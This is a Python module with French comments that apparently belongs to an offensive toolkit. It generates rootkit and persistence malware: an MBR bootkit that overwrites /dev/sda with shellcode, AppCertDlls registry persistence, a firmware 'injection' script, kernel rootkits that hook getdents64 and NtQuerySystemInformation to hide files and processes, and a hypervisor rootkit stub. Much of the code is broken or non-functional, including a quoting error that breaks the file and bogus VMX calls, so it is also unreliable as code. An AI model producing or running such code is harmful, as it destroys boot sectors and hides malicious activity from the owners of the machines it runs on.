#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
🕷️ ADVANCED PERSISTENCE - Module de persistance avancée
Rootkits, bootkits, firmware, BIOS/UEFI persistence
"""

import os
import subprocess
import threading
import time
import json
import base64
import random
import string
from datetime import datetime

class AdvancedPersistence:
    def __init__(self):
        self.persistence_methods = []
        self.active_persistence = []
        
    def create_bootkit(self, target_os):
        """Crée un bootkit pour persistance au démarrage"""
        print(f"🕷️ Création bootkit: {target_os}")
        
        try:
            bootkit_dir = "bootkits"
            os.makedirs(bootkit_dir, exist_ok=True)
            
            bootkit_name = f"bootkit_{target_os}_{int(time.time())}"
            bootkit_file = os.path.join(bootkit_dir, f"{bootkit_name}.py")
            
            if target_os == "linux":
                bootkit_code = f'''#!/usr/bin/env python3
import os
import subprocess
import time
import threading

class LinuxBootkit:
    def __init__(self):
        self.mbr_backup = "/tmp/mbr_backup"
        self.bootkit_code = b"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
        
    def backup_mbr(self):
        """Sauvegarde le MBR original"""
        try:
            subprocess.run(["dd", "if=/dev/sda", "of=" + self.mbr_backup, "bs=512", "count=1"], 
                         capture_output=True)
            print("[+] MBR sauvegardé")
            return True
        except:
            return False
            
    def inject_bootkit(self):
        """Injecte le bootkit dans le MBR"""
        try:
            # Créer le nouveau MBR avec le bootkit
            mbr_data = b"\\x90" * 446  # Bootloader
            mbr_data += self.bootkit_code  # Shellcode
            mbr_data += b"\\x00" * (512 - len(mbr_data))  # Padding
            
            # Écrire le nouveau MBR
            with open("/tmp/bootkit_mbr", "wb") as f:
                f.write(mbr_data)
                
            subprocess.run(["dd", "if=/tmp/bootkit_mbr", "of=/dev/sda", "bs=512", "count=1"], 
                         capture_output=True)
            
            print("[+] Bootkit injecté dans le MBR")
            return True
        except:
            return False
            
    def install(self):
        """Installe le bootkit"""
        if self.backup_mbr():
            return self.inject_bootkit()
        return False

if __name__ == "__main__":
    bootkit = LinuxBootkit()
    bootkit.install()
'''
            else:  # Windows
                bootkit_code = f'''#!/usr/bin/env python3
import os
import subprocess
import winreg
import ctypes

class WindowsBootkit:
    def __init__(self):
        self.bootkit_dll = "bootkit.dll"
        self.registry_key = "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls"
        
    def create_bootkit_dll(self):
        """Crée une DLL bootkit"""
        dll_code = '''
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {{
    switch (reason) {{
        case DLL_PROCESS_ATTACH:
            // Code malveillant ici
            system("cmd.exe /c calc.exe");
            break;
    }}
    return TRUE;
}}
'''
        with open(self.bootkit_dll, 'w') as f:
            f.write(dll_code)
            
    def inject_registry(self):
        """Injecte dans le registre pour persistance"""
        try:
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, 
                                 "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls")
            winreg.SetValueEx(key, "AppCertDlls", 0, winreg.REG_SZ, self.bootkit_dll)
            winreg.CloseKey(key)
            return True
        except:
            return False
            
    def install(self):
        """Installe le bootkit Windows"""
        self.create_bootkit_dll()
        return self.inject_registry()

if __name__ == "__main__":
    bootkit = WindowsBootkit()
    bootkit.install()
'''
            
            with open(bootkit_file, 'w', encoding='utf-8') as f:
                f.write(bootkit_code)
            
            bootkit_info = {
                'name': bootkit_name,
                'target_os': target_os,
                'file': bootkit_file,
                'timestamp': datetime.now().isoformat(),
                'type': 'bootkit'
            }
            
            self.persistence_methods.append(bootkit_info)
            print(f"✅ Bootkit créé: {bootkit_file}")
            return bootkit_file
            
        except Exception as e:
            print(f"❌ Erreur création bootkit: {e}")
            return None
    
    def create_firmware_persistence(self, target_os):
        """Crée une persistance au niveau firmware"""
        print(f"🕷️ Création persistance firmware: {target_os}")
        
        try:
            firmware_dir = "firmware_persistence"
            os.makedirs(firmware_dir, exist_ok=True)
            
            firmware_name = f"firmware_persist_{target_os}_{int(time.time())}"
            firmware_file = os.path.join(firmware_dir, f"{firmware_name}.py")
            
            firmware_code = f'''#!/usr/bin/env python3
import os
import subprocess
import time

class FirmwarePersistence:
    def __init__(self):
        self.target_os = "{target_os}"
        self.firmware_backup = "/tmp/firmware_backup.bin"
        
    def backup_firmware(self):
        """Sauvegarde le firmware original"""
        try:
            if self.target_os == "linux":
                # Sauvegarder UEFI/BIOS
                subprocess.run(["flashrom", "-r", self.firmware_backup], capture_output=True)
            else:
                # Windows - sauvegarder BIOS
                subprocess.run(["bcdedit", "/set", "bootdebug", "on"], capture_output=True)
            return True
        except:
            return False
            
    def inject_firmware(self):
        """Injecte le code malveillant dans le firmware"""
        try:
            # Code malveillant pour le firmware
            malicious_code = b"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
            
            # Modifier le firmware
            with open("/tmp/modified_firmware.bin", "wb") as f:
                f.write(malicious_code)
                
            print("[+] Code malveillant injecté dans le firmware")
            return True
        except:
            return False
            
    def install(self):
        """Installe la persistance firmware"""
        if self.backup_firmware():
            return self.inject_firmware()
        return False

if __name__ == "__main__":
    firmware = FirmwarePersistence()
    firmware.install()
'''
            
            with open(firmware_file, 'w', encoding='utf-8') as f:
                f.write(firmware_code)
            
            firmware_info = {
                'name': firmware_name,
                'target_os': target_os,
                'file': firmware_file,
                'timestamp': datetime.now().isoformat(),
                'type': 'firmware_persistence'
            }
            
            self.persistence_methods.append(firmware_info)
            print(f"✅ Persistance firmware créée: {firmware_file}")
            return firmware_file
            
        except Exception as e:
            print(f"❌ Erreur création persistance firmware: {e}")
            return None
    
    def create_kernel_rootkit(self, target_os):
        """Crée un rootkit au niveau kernel"""
        print(f"🕷️ Création kernel rootkit: {target_os}")
        
        try:
            rootkit_dir = "kernel_rootkits"
            os.makedirs(rootkit_dir, exist_ok=True)
            
            rootkit_name = f"kernel_rootkit_{target_os}_{int(time.time())}"
            rootkit_file = os.path.join(rootkit_dir, f"{rootkit_name}.c")
            
            if target_os == "linux":
                rootkit_code = f'''#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Kernel Rootkit");
MODULE_DESCRIPTION("Advanced Kernel Rootkit");

// Fonction pour cacher les processus
static int hide_process(const char *name) {{
    struct task_struct *task;
    for_each_process(task) {{
        if (strstr(task->comm, name)) {{
            list_del(&task->tasks);
            return 0;
        }}
    }}
    return -1;
}}

// Hook syscall pour cacher les fichiers
asmlinkage long (*original_getdents64)(const struct pt_regs *);
asmlinkage long hook_getdents64(const struct pt_regs *regs) {{
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    long ret = original_getdents64(regs);
    
    unsigned long off = 0;
    struct linux_dirent64 *dir, *kdirent, *prev = NULL;
    struct linux_dirent64 *current_dir, *dirent_ker = NULL;
    
    dirent_ker = kzalloc(ret, GFP_KERNEL);
    
    if (ret <= 0 || dirent_ker == NULL)
        return ret;
        
    if (copy_from_user(dirent_ker, dirent, ret))
        goto done;
        
    dir = dirent_ker;
    while (off < ret) {{
        if (strstr(dir->d_name, "rootkit") || strstr(dir->d_name, "malware")) {{
            if (dir == dirent_ker) {{
                ret -= dir->d_reclen;
                memmove(dir, (char *)dir + dir->d_reclen, ret);
                continue;
            }}
            prev->d_reclen += dir->d_reclen;
        }} else {{
            prev = dir;
        }}
        off += dir->d_reclen;
        dir = (struct linux_dirent64 *)((char *)dir + dir->d_reclen);
    }}
    
    if (copy_to_user(dirent, dirent_ker, ret))
        goto done;
        
done:
    kfree(dirent_ker);
    return ret;
}}

static int __init rootkit_init(void) {{
    printk(KERN_INFO "Kernel Rootkit chargé\\n");
    
    // Hook le syscall getdents64
    original_getdents64 = (void *)sys_call_table[__NR_getdents64];
    sys_call_table[__NR_getdents64] = (unsigned long)hook_getdents64;
    
    return 0;
}}

static void __exit rootkit_exit(void) {{
    printk(KERN_INFO "Kernel Rootkit déchargé\\n");
    
    // Restaurer le syscall original
    sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
}}

module_init(rootkit_init);
module_exit(rootkit_exit);
'''
            else:  # Windows
                rootkit_code = f'''#include <ntddk.h>
#include <ntddkbd.h>

DRIVER_INITIALIZE DriverEntry;
DRIVER_UNLOAD DriverUnload;

// Hook pour cacher les processus
NTSTATUS HookNtQuerySystemInformation(
    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
    OUT PVOID SystemInformation,
    IN ULONG SystemInformationLength,
    OUT PULONG ReturnLength
) {{
    NTSTATUS status = OriginalNtQuerySystemInformation(
        SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength
    );
    
    if (NT_SUCCESS(status) && SystemInformationClass == SystemProcessInformation) {{
        // Cacher les processus malveillants
        PSYSTEM_PROCESS_INFORMATION spi = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
        PSYSTEM_PROCESS_INFORMATION prev = NULL;
        
        while (spi->NextEntryOffset) {{
            if (strstr(spi->ImageName.Buffer, "malware") || 
                strstr(spi->ImageName.Buffer, "rootkit")) {{
                if (prev) {{
                    prev->NextEntryOffset += spi->NextEntryOffset;
                }}
            }} else {{
                prev = spi;
            }}
            spi = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)spi + spi->NextEntryOffset);
        }}
    }}
    
    return status;
}}

NTSTATUS DriverEntry(
    IN PDRIVER_OBJECT DriverObject,
    IN PUNICODE_STRING RegistryPath
) {{
    DbgPrint("Kernel Rootkit chargé\\n");
    
    // Installer le hook
    // Code pour hooker NtQuerySystemInformation
    
    DriverObject->DriverUnload = DriverUnload;
    return STATUS_SUCCESS;
}}

VOID DriverUnload(
    IN PDRIVER_OBJECT DriverObject
) {{
    DbgPrint("Kernel Rootkit déchargé\\n");
    // Restaurer les hooks
}}
'''
            
            with open(rootkit_file, 'w', encoding='utf-8') as f:
                f.write(rootkit_code)
            
            rootkit_info = {
                'name': rootkit_name,
                'target_os': target_os,
                'file': rootkit_file,
                'timestamp': datetime.now().isoformat(),
                'type': 'kernel_rootkit'
            }
            
            self.persistence_methods.append(rootkit_info)
            print(f"✅ Kernel rootkit créé: {rootkit_file}")
            return rootkit_file
            
        except Exception as e:
            print(f"❌ Erreur création kernel rootkit: {e}")
            return None
    
    def create_hypervisor_rootkit(self):
        """Crée un rootkit hyperviseur"""
        print(f"🕷️ Création hypervisor rootkit")
        
        try:
            hv_dir = "hypervisor_rootkits"
            os.makedirs(hv_dir, exist_ok=True)
            
            hv_name = f"hypervisor_rootkit_{int(time.time())}"
            hv_file = os.path.join(hv_dir, f"{hv_name}.c")
            
            hv_code = f'''#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/mm.h>
#include <linux/sched.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Hypervisor Rootkit");
MODULE_DESCRIPTION("Advanced Hypervisor Rootkit");

// Structure pour l'hyperviseur
typedef struct {{
    unsigned long cr3;
    unsigned long ept_pointer;
    unsigned long vmcs;
}} hypervisor_data_t;

static hypervisor_data_t hv_data;

// Fonction pour installer l'hyperviseur
static int install_hypervisor(void) {{
    // Sauvegarder les registres
    hv_data.cr3 = read_cr3();
    
    // Configurer EPT (Extended Page Tables)
    hv_data.ept_pointer = 0x1000000;  // Adresse EPT
    
    // Configurer VMCS (Virtual Machine Control Structure)
    hv_data.vmcs = 0x2000000;  // Adresse VMCS
    
    // Activer VMX
    write_cr4(read_cr4() | X86_CR4_VMXE);
    
    // Configurer VMXON
    vmxon(&hv_data.vmcs);
    
    printk(KERN_INFO "Hypervisor installé\\n");
    return 0;
}}

// Hook pour intercepter les accès mémoire
static int hook_page_fault(struct pt_regs *regs, unsigned long error_code) {{
    unsigned long address = read_cr2();
    
    // Vérifier si c'est un accès à notre code malveillant
    if (address >= 0x1000000 && address < 0x2000000) {{
        // Rediriger vers notre code
        regs->ip = 0x3000000;  // Adresse de notre shellcode
        return 0;
    }}
    
    return 1;  // Continuer le traitement normal
}}

static int __init hypervisor_init(void) {{
    printk(KERN_INFO "Hypervisor Rootkit chargé\\n");
    
    // Installer l'hyperviseur
    install_hypervisor();
    
    // Installer le hook page fault
    // set_page_fault_handler(hook_page_fault);
    
    return 0;
}}

static void __exit hypervisor_exit(void) {{
    printk(KERN_INFO "Hypervisor Rootkit déchargé\\n");
    
    // Désactiver VMX
    vmxoff();
    write_cr4(read_cr4() & ~X86_CR4_VMXE);
}}

module_init(hypervisor_init);
module_exit(hypervisor_exit);
'''
            
            with open(hv_file, 'w', encoding='utf-8') as f:
                f.write(hv_code)
            
            hv_info = {
                'name': hv_name,
                'file': hv_file,
                'timestamp': datetime.now().isoformat(),
                'type': 'hypervisor_rootkit'
            }
            
            self.persistence_methods.append(hv_info)
            print(f"✅ Hypervisor rootkit créé: {hv_file}")
            return hv_file
            
        except Exception as e:
            print(f"❌ Erreur création hypervisor rootkit: {e}")
            return None 